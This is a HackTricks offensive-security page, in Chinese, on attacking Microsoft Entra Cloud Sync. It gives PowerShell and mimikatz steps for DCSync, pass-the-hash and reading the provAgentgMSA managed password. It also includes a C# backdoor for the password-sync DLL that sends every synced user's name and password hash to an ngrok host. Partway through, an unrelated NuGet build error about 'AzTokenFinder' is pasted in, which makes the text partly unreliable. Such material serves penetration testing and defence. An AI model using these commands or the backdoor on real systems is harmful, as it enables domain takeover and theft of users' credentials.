# Az - Cloud Sync

{{#include ../../../banners/hacktricks-training.md}}

## 基本信息

**Cloud Sync** 基本上是 Azure 用于 **将用户从 AD 同步到 Entra ID** 的新方式。

[来自文档：](https://learn.microsoft.com/en-us/entra/identity/hybrid/cloud-sync/what-is-cloud-sync) Microsoft Entra Cloud Sync 是 Microsoft 提供的一项新服务，旨在满足和实现您在用户、组和联系人同步到 Microsoft Entra ID 的混合身份目标。它通过使用 Microsoft Entra 云配置代理而不是 Microsoft Entra Connect 应用程序来实现这一点。然而，它可以与 Microsoft Entra Connect Sync 一起使用。

### 生成的主体

为了使其正常工作，在 Entra ID 和本地目录中创建了一些主体：

- 在 Entra ID 中，用户 `On-Premises Directory Synchronization Service Account` (`ADToAADSyncServiceAccount@carloshacktricks.onmicrosoft.com`) 被创建，角色为 **`Directory Synchronization Accounts`** (`d29b2b05-8046-44ba-8758-1e26182fcf32`)。

> [!WARNING]
> 此角色曾经拥有很多特权权限，可以用来 [**提升权限甚至到全局管理员**](https://medium.com/tenable-techblog/stealthy-persistence-with-directory-synchronization-accounts-role-in-entra-id-63e56ce5871b)。然而，Microsoft 决定移除此角色的所有权限，并仅分配一个新的 **`microsoft.directory/onPremisesSynchronization/standard/read`**，这实际上不允许执行任何特权操作（如修改用户的密码或属性或向 SP 添加新凭据）。

- 在 Entra ID 中，还创建了没有成员或所有者的组 **`AAD DC Administrators`**。如果使用 [`Microsoft Entra Domain Services`](./az-domain-services.md)，此组非常有用。

- 在 AD 中，服务帐户 **`provAgentgMSA`** 被创建，SamAccountName 类似于 **`pGMSA_<id>$@domain.com`** (`Get-ADServiceAccount -Filter * | Select Name,SamAccountName`)，或者需要具有 [**这些权限的自定义帐户**](https://learn.microsoft.com/en-us/entra/identity/hybrid/cloud-sync/how-to-prerequisites?tabs=public-cloud#custom-gmsa-account)。通常会创建默认帐户。

> [!WARNING]
> 除其他权限外，服务帐户 **`provAgentgMSA`** 拥有 DCSync 权限，允许 **任何人一旦妥协它就能妥协整个目录**。有关 DCSync 的更多信息，请查看 [此处](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html)。

> [!NOTE]
> 默认情况下，具有 **`adminCount` 为 1 的已知特权组（如域管理员）的用户出于安全原因不会与 Entra ID 同步。然而，其他没有此属性的特权组成员或直接分配高权限的用户 **可以被同步**。

## 密码同步

该部分与以下内容非常相似：

{{#ref}}
az-connect-sync.md
{{#endref}}

- **密码哈希同步** 可以启用，以便用户能够 **使用他们在 AD 中的密码登录 Entra ID**。此外，每当在 AD 中修改密码时，它将在 Entra ID 中更新。
- **密码回写** 也可以启用，允许用户在 Entra ID 中修改他们的密码，并自动同步他们在本地域中的密码。但根据 [当前文档](https://learn.microsoft.com/en-us/entra/identity/authentication/tutorial-enable-sspr-writeback#configure-password-writeback)，这需要使用 Connect Agent，因此请查看 [Az Connect Sync 部分](./az-connect-sync.md) 以获取更多信息。
- **组回写**：此功能允许 Entra ID 中的组成员资格同步回本地 AD。这意味着如果用户被添加到 Entra ID 中的组，他们也将被添加到 AD 中的相应组。

## 侧向移动

### AD --> Entra ID

- 如果 AD 用户正在从 AD 同步到 Entra ID，则从 AD 到 Entra ID 的侧向移动是直接的，只需 **妥协某个用户的密码或更改某个用户的密码，或创建一个新用户并等待它同步到 Entra ID 目录（通常只需几分钟）**。

例如，您可以：
- 妥协 **`provAgentgMSA`** 帐户，执行 DCSync 攻击，破解某个用户的密码，然后用它登录 Entra ID。
- 只需在 AD 中创建一个新用户，等待它同步到 Entra ID，然后用它登录 Entra ID。
- 修改 AD 中某个用户的密码，等待它同步到 Entra ID，然后用它登录 Entra ID。

要妥协 **`provAgentgMSA`** 凭据：
```powershell
# Enumerate provAgentgMSA account
Get-ADServiceAccount -Filter * -Server domain.local
# Find who can read the password of the gMSA (usually only the DC computer account)
Get-ADServiceAccount -Identity pGMSA_<id>$ -Properties * -Server domain.local | selectPrincipalsAllowedToRetrieveManagedPassword

# You need to perform a PTH with the hash of the DC computer account next. For example using mimikatz:
lsadump::dcsync /domain:domain.local /user:<dc-name>$
sekurlsa::pth /user:<dc-name>$ /domain:domain.local /ntlm:<hash> /run:"cmd.exe"

# Or you can change who can read the password of the gMSA account to all domain admins for example:
Set-ADServiceAccount -Identity 'pGMSA_<id>$' -PrincipalsAllowedToRetrieveManagedPassword 'Domain Admins'

# Read the password of the gMSA
$Passwordblob = (Get-ADServiceAccount -Identity pGMSA_<id>$ -Properties msDS-ManagedPassword -server domain.local).'msDS-ManagedPassword'

#Install-Module -Name DSInternals
#Import-Module DSInternals
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```
现在您可以使用 gMSA 的哈希值对 Entra ID 执行 Pass-the-Hash 攻击，使用 `provAgentgMSA` 账户并保持持久性，从而能够对 AD 执行 DCSync 攻击。

有关如何破坏 Active Directory 的更多信息，请查看：

{{#ref}}
https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
{{#endref}}

> [!NOTE]
> 请注意，无法根据其属性为同步用户在 Cloud Sync 配置中授予 Azure 或 EntraID 角色。然而，为了自动授予同步用户权限，某些 **来自 AD 的 Entra ID 组** 可能会被授予权限，因此这些组内的同步用户也会接收到这些权限，或者 **可以使用动态组**，因此始终检查动态规则和潜在的滥用方式：

{{#ref}}
../az-privilege-escalation/az-entraid-privesc/dynamic-groups.md
{{#endref}}

关于持久性，[这篇博客文章](https://tierzerosecurity.co.nz/2024/05/21/ms-entra-connect-sync-mothods.html) 建议可以使用 [**dnSpy**](https://github.com/dnSpy/dnSpy) 来后门 **`Microsoft.Online.Passwordsynchronisation.dll`**，该文件位于 **`C:\Program Files\Microsoft Azure AD Sync\Bin`**，由 Cloud Sync 代理使用以执行密码同步，使其将被同步用户的密码哈希导出到远程服务器。哈希是在 **`PasswordHashGenerator`** 类内部生成的，博客文章建议添加一些代码，使该类看起来像（注意 `use System.Net` 和 `WebClient` 的使用以导出密码哈希）：
```csharp
using System;
using System.Net;
using Microsoft.Online.PasswordSynchronization.DirectoryReplicationServices;

namespace Microsoft.Online.PasswordSynchronization
{
// Token: 0x0200003E RID: 62
public class PasswordHashGenerator : ClearPasswordHashGenerator
{
// Token: 0x06000190 RID: 400 RVA: 0x00006DFC File Offset: 0x00004FFC
public override PasswordHashData CreatePasswordHash(ChangeObject changeObject)
{
PasswordHashData passwordHashData = base.CreatePasswordHash(changeObject);
try
{
using (WebClient webClient = new WebClient())
{
webClient.DownloadString("https://786a39c7cb68.ngrok-free.app?u=" + changeObject.DistinguishedName + "&p=" + passwordHashData.Hash);
}
}
catch (Exception)
{
}
return new PasswordHashData
{
Hash = OrgIdHashGenerator.Generate(passwordHashData.Hash),
RawHash = passwordHashData.RawHash
};
}
}
}
```
NuGet 包恢复失败，项目 AzTokenFinder：无法找到包 'System.Security.Cryptography.X509Certificates' 的版本 '4.3.2'。  
C:\Program Files (x86)\Microsoft SDKs\NuGetPackages\: 在源 'C:\Program Files (x86)\Microsoft SDKs\NuGetPackages\' 中未找到包 'System.Security.Cryptography.X509Certificates.4.3.2'。  
请查看错误列表窗口以获取详细的警告和错误。

### Entra ID --> AD

- 如果启用了 **Password Writeback**，您可以从 Entra ID 修改某些用户的密码，如果您可以访问 AD 网络，则可以使用这些密码进行连接。有关更多信息，请查看 [Az Connect Sync section](./az-connect-sync.md) 部分，因为密码写回是通过该代理配置的。

- 此时，Cloud Sync 还允许 **"Microsoft Entra ID to AD"**，但经过一段时间后我发现它无法将 EntraID 用户同步到 AD，并且它只能同步与密码哈希同步的 EntraID 用户，这些用户来自与我们正在同步的域属于同一域林的域，正如您在 [https://learn.microsoft.com/en-us/entra/identity/hybrid/group-writeback-cloud-sync#supported-groups-and-scale-limits](https://learn.microsoft.com/en-us/entra/identity/hybrid/group-writeback-cloud-sync#supported-groups-and-scale-limits) 中所读到的：

> - 这些组只能包含本地同步的用户和/或额外的云创建的安全组。  
> - 被同步的本地用户帐户和此云创建的安全组的成员，可以来自同一域或跨域，但它们必须来自同一林。

因此，该服务的攻击面（和实用性）大大降低，因为攻击者需要破坏初始 AD，才能破坏其他域中的用户（而且这两个域显然必须在同一林中）。

### Enumeration
```bash
# Check for the gMSA SA
Get-ADServiceAccount -Filter "ObjectClass -like 'msDS-GroupManagedServiceAccount'"

# Get all the configured cloud sync agents (usually one per on-premise domain)
## In the machine name of each you can infer the name of the domain
az rest \
--method GET \
--uri "https://graph.microsoft.com/beta/onPremisesPublishingProfiles('provisioning')/agents/?\$expand=agentGroups" \
--headers "Content-Type=application/json"
```
{{#include ../../../banners/hacktricks-training.md}}
